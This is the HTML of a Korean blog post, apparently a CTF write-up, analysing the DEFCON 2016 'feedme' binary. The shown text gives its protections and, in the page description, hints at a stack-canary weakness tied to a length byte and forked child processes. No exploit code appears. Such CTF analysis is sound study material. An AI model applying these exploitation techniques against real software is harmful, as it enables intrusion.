var(--primary-text-color);font-size:40px;font-weight:700;margin-bottom:15px;padding-bottom:7px;text-align:center;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.category-page-header-wrapper .category-page-subtitle{font-size:20px;font-weight:500;padding-bottom:10px;text-align:center}.post-card-wrapper{display:flex;justify-content:center;min-height:150px;width:100%}.post-card-wrapper .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;height:100%;margin-bottom:15px;max-width:720px;padding:15px;transition:transform .2s;width:100%}.post-card-wrapper .post-card:hover .title{text-decoration:underline}@media(min-width:768px){.post-card-wrapper .post-card{margin-bottom:0}}.post-card-wrapper .post-card .title{font-size:18px;font-weight:600;line-height:1.4;margin-bottom:7px}.post-card-wrapper .post-card .description{-webkit-line-clamp:3;-webkit-box-orient:vertical;color:var(--primary-text-color);display:-webkit-box;font-size:13px;line-height:20px;margin-bottom:10px;overflow:hidden;text-overflow:ellipsis}.post-card-wrapper .post-card .info{color:var(--about-link-icon-color);display:flex;font-size:14px;justify-content:space-between;margin-top:auto}.post-card-wrapper .post-card .info .categories{display:flex}.post-card-wrapper .post-card .info .categories .category{margin-left:4px}.post-card-wrapper .post-card .info .categories .category:hover{text-decoration:underline}.post-card-column-wrapper{display:flex;justify-content:center;width:100%}.post-card-column-wrapper .post-card-column{align-items:center;display:flex;flex-direction:column}.post-card-column-wrapper .post-card-column .post-card-wrapper{margin-bottom:10px}.post-card-column-wrapper .post-card-column .more-post-card-button{background-color:var(--button-background-color);font-size:15px;font-weight:500;height:40px}.post-tabs-wrapper{align-self:flex-start;display:flex;flex-direction:column;justify-content:center;top:0;width:100%}.post-tabs-wrapper .post-tabs{display:flex;height:40px;justify-content:center;margin-bottom:12px;max-width:760px;width:100%}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root{color:var(--tab-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:17px;font-weight:500;height:40px;min-height:auto;min-width:auto;padding:10px 12px;transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected,.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root :hover{color:var(--tab-hover-text-color);transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected{background-color:var(--tab-selected-background-color);border-radius:8px;font-weight:600}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabScrollButton-root{height:40px;width:20px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-scrollable{height:40px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-indicator{display:none}</style><meta name="generator" content="Gatsby 3.14.5"/><style data-emotion="css-global o6gwfi">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:rgba(0, 0, 0, 0.87);font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#fff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#fff;}</style><style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style><style data-emotion="css 1l6di18 feqhe6 11tfndm mnn31 vubbuv 1yxmbwk 6flbmm">.css-1l6di18.Mui-focused .MuiAutocomplete-clearIndicator{visibility:visible;}@media (pointer: fine){.css-1l6di18:hover .MuiAutocomplete-clearIndicator{visibility:visible;}}.css-1l6di18 .MuiAutocomplete-tag{margin:3px;max-width:calc(100% - 6px);}.css-1l6di18 .MuiAutocomplete-inputRoot{-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiAutocomplete-inputRoot,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:30px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:56px;}.css-1l6di18 .MuiAutocomplete-inputRoot .MuiAutocomplete-input{width:0;min-width:30px;}.css-1l6di18 .MuiInput-root{padding-bottom:1px;}.css-1l6di18 .MuiInput-root .MuiInput-input{padding:4px 4px 4px 0px;}.css-1l6di18 .MuiInput-root.MuiInputBase-sizeSmall .MuiInput-input{padding:2px 4px 3px 0;}.css-1l6di18 .MuiOutlinedInput-root{padding:9px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiOutlinedInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:65px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-input{padding:7.5px 4px 7.5px 6px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall{padding:6px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall .MuiAutocomplete-input{padding:2.5px 4px 2.5px 6px;}.css-1l6di18 .MuiFilledInput-root{padding-top:19px;padding-left:8px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiFilledInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:65px;}.css-1l6di18 .MuiFilledInput-root .MuiFilledInput-input{padding:7px 4px;}.css-1l6di18 .MuiFilledInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall{padding-bottom:1px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall .MuiFilledInput-input{padding:2.5px 4px;}.css-1l6di18 .MuiInputBase-hiddenLabel{padding-top:8px;}.css-1l6di18 .MuiAutocomplete-input{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;text-overflow:ellipsis;opacity:1;}.css-feqhe6{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;width:100%;}.css-11tfndm{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;letter-spacing:0.00938em;color:rgba(0, 0, 0, 0.87);box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;position:relative;}.css-11tfndm.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}label+.css-11tfndm{margin-top:16px;}.css-11tfndm:after{border-bottom:2px solid #1976d2;left:0;bottom:0;content:"";position:absolute;right:0;-webkit-transform:scaleX(0);-moz-transform:scaleX(0);-ms-transform:scaleX(0);transform:scaleX(0);-webkit-transition:-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;pointer-events:none;}.css-11tfndm.Mui-focused:after{-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-11tfndm.Mui-error:after{border-bottom-color:#d32f2f;-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-11tfndm:before{border-bottom:1px solid rgba(0, 0, 0, 0.42);left:0;bottom:0;content:"\00a0";position:absolute;right:0;-webkit-transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;pointer-events:none;}.css-11tfndm:hover:not(.Mui-disabled):before{border-bottom:2px solid rgba(0, 0, 0, 0.87);}@media (hover: none){.css-11tfndm:hover:not(.Mui-disabled):before{border-bottom:1px solid rgba(0, 0, 0, 0.42);}}.css-11tfndm.Mui-disabled:before{border-bottom-style:dotted;}.css-mnn31{font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;}.css-mnn31::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:focus{outline:0;}.css-mnn31:invalid{box-shadow:none;}.css-mnn31::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-ms-input-placeholder{opacity:0.42;}.css-mnn31.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-mnn31:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}.css-1yxmbwk{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-align:center;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;font-size:1.5rem;padding:8px;border-radius:50%;overflow:visible;color:rgba(0, 0, 0, 0.54);-webkit-transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1yxmbwk::-moz-focus-inner{border-style:none;}.css-1yxmbwk.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1yxmbwk{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1yxmbwk:hover{background-color:rgba(0, 0, 0, 0.04);}@media (hover: none){.css-1yxmbwk:hover{background-color:transparent;}}.css-1yxmbwk.Mui-disabled{background-color:transparent;color:rgba(0, 0, 0, 0.26);}.css-6flbmm{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:2.1875rem;}</style><link rel="preconnect" href="https://www.google-analytics.com"/><link rel="dns-prefetch" href="https://www.google-analytics.com"/><script>
+  
+  function gaOptout(){document.cookie=disableStr+'=true; expires=Thu, 31 Dec 2099 23:59:59 UTC;path=/',window[disableStr]=!0}var gaProperty='0',disableStr='ga-disable-'+gaProperty;document.cookie.indexOf(disableStr+'=true')>-1&&(window[disableStr]=!0);
+  if(true) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  }
+  if (typeof ga === "function") {
+    ga('create', '0', 'auto', {});
+      ga('set', 'anonymizeIp', true);
+      
+      
+      
+      
+      }</script><link rel="icon" href="/favicon-32x32.png?v=ad9e124e5060ab5ddbaf24744e1cfc72" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><style type="text/css">
+    .anchor.before {
+      position: absolute;
+      top: 0;
+      left: 0;
+      transform: translateX(-100%);
+      padding-right: 4px;
+    }
+    .anchor.after {
+      display: inline-block;
+      padding-left: 4px;
+    }
+    h1 .anchor svg,
+    h2 .anchor svg,
+    h3 .anchor svg,
+    h4 .anchor svg,
+    h5 .anchor svg,
+    h6 .anchor svg {
+      visibility: hidden;
+    }
+    h1:hover .anchor svg,
+    h2:hover .anchor svg,
+    h3:hover .anchor svg,
+    h4:hover .anchor svg,
+    h5:hover .anchor svg,
+    h6:hover .anchor svg,
+    h1 .anchor:focus svg,
+    h2 .anchor:focus svg,
+    h3 .anchor:focus svg,
+    h4 .anchor:focus svg,
+    h5 .anchor:focus svg,
+    h6 .anchor:focus svg {
+      visibility: visible;
+    }
+  </style><script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+      var hash = window.decodeURI(location.hash.replace('#', ''))
+      if (hash !== '') {
+        var element = document.getElementById(hash)
+        if (element) {
+          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
+          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
+          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
+          // Wait for the browser to finish rendering before scrolling.
+          setTimeout((function() {
+            window.scrollTo(0, offset - 0)
+          }), 0)
+        }
+      }
+    })
+  </script><title data-react-helmet="true">DEFCON 2016 feedme 취약점 분석</title><meta data-react-helmet="true" name="viewport" content="initial-scale=1, width=device-width"/><meta data-react-helmet="true" property="og:title" content="DEFCON 2016 feedme 취약점 분석"/><meta data-react-helmet="true" property="og:site_title" content="DEFCON 2016 feedme 취약점 분석"/><meta data-react-helmet="true" name="description" content="취약점 분석 바이너리 개요  보호 기법 stripped statically linked 32 bit 보호기법 No RELRO Canary found NX enabled PIE disabled 바이너리 분석  로직 분석1  바이너리의 입력 값으로  를  입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.  로직 분석2 하지만  바이너리의 입력 값으로 를  번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.  systemcall system 호출 범위를 분석하던 중  시그널을 보낸 후  함수를 바탕으로  출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는  함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다. main 함수 분석  main 함수 분석 ma…"/><meta data-react-helmet="true" property="og:description" content="취약점 분석 바이너리 개요  보호 기법 stripped statically linked 32 bit 보호기법 No RELRO Canary found NX enabled PIE disabled 바이너리 분석  로직 분석1  바이너리의 입력 값으로  를  입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.  로직 분석2 하지만  바이너리의 입력 값으로 를  번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.  systemcall system 호출 범위를 분석하던 중  시그널을 보낸 후  함수를 바탕으로  출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는  함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다. main 함수 분석  main 함수 분석 ma…"/><meta data-react-helmet="true" property="og:author" content="Zer0Luck"/><meta data-react-helmet="true" property="og:image" content="/og-image.png"/><meta data-react-helmet="true" property="og:type" content="website"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc4.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxK.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc4.woff2"/><style>@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc-.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxM.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc-.woff) format("woff")}</style><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="alternate" type="application/rss+xml" href="/rss.xml"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){if(void 0===e.target.dataset.mainImage)return;if(void 0===e.target.dataset.gatsbyImageSsr)return;const t=e.target;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link as="script" rel="preload" href="/webpack-runtime-7540f1a080c56993ae69.js"/><link as="script" rel="preload" href="/framework-373e01a4682a5f0c98a3.js"/><link as="script" rel="preload" href="/app-7556968f1157cba98cd0.js"/><link as="script" rel="preload" href="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-f8cf487d5388e1dc0b4b.js"/><link as="script" rel="preload" href="/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js"/><link as="fetch" rel="preload" href="/page-data/defcon2016_feedme_ctf_writeup/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1073350324.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1956554647.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/2938748437.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="page-wrapper"><header class="page-header-wrapper"><div class="page-header"><div class="front-section"><a class="link" href="/">Zer0Luck</a></div><div class="trailing-section"><a class="link" href="/about">about</a><a class="link" href="/posts">posts</a><div class="MuiAutocomplete-root MuiAutocomplete-hasPopupIcon css-1l6di18" role="combobox" aria-expanded="false"><div class="search-input-wrapper"><div class="MuiFormControl-root MuiFormControl-fullWidth MuiTextField-root search-input css-feqhe6"><div class="MuiInput-root MuiInput-underline MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl MuiInputBase-adornedEnd MuiAutocomplete-inputRoot css-11tfndm"><input type="text" aria-invalid="false" autoComplete="off" value="" class="MuiInput-input MuiInputBase-input MuiInputBase-inputAdornedEnd MuiAutocomplete-input MuiAutocomplete-inputFocused css-mnn31" aria-autocomplete="list" autoCapitalize="none" spellcheck="false"/><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium search-icon css-vubbuv" focusable="false" viewBox="0 0 24 24" aria-hidden="true" data-testid="SearchOutlinedIcon"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg></div></div></div></div></div></div></header><main class="page-content"><header class="post-header"><div class="emoji">🐷</div><div class="info"><div class="categories"><a class="category" href="/posts/CTF">CTF</a></div></div><h1 class="title">DEFCON 2016 feedme 취약점 분석</h1><div class="info"><div class="author">posted by <strong>Zer0Luck</strong>,</div> <!-- -->September 18, 2020</div></header><div class="post-content"><div class="markdown"><h1 id="취약점-분석" style="position:relative;"><a href="#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D" aria-label="취약점 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>취약점 분석</h1>
+<h2 id="바이너리-개요" style="position:relative;"><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94" aria-label="바이너리 개요 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>바이너리 개요</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAm0lEQVQI113G3Q6CIABAYV8kMwEBCZWYKAo5bfkznBe6Wl31/m/RWl21fTs73jC/BreNy6Obtml5XoZ1nO+9u5nOVc1kWyfyJs40FzVNylRalmrKy6PQXIyeqq/F2VZK9cYoVVDO4zRDMdtDFKDoywfQh/DXz6AdOIQ496Rak1PPmFGyldSQqA6iKoxqSCwkFhADsIHkjwVYY+beGx4kALDjRscAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./0.png"
+        title="./0.png"
+        src="/static/58cf3fddb230a4806e842b381299afb8/37523/0.png"
+        srcset="/static/58cf3fddb230a4806e842b381299afb8/e9ff0/0.png 180w,
+/static/58cf3fddb230a4806e842b381299afb8/f21e7/0.png 360w,
+/static/58cf3fddb230a4806e842b381299afb8/37523/0.png 720w,
+/static/58cf3fddb230a4806e842b381299afb8/a8417/0.png 941w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>보호 기법</p>
+<ul>
+<li>stripped</li>
+<li>statically linked</li>
+<li>32 bit</li>
+</ul>
+<h2 id="보호기법" style="position:relative;"><a href="#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95" aria-label="보호기법 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>보호기법</h2>
+<ul>
+<li>No RELRO</li>
+<li>Canary found</li>
+<li>NX enabled</li>
+<li>PIE disabled</li>
+</ul>
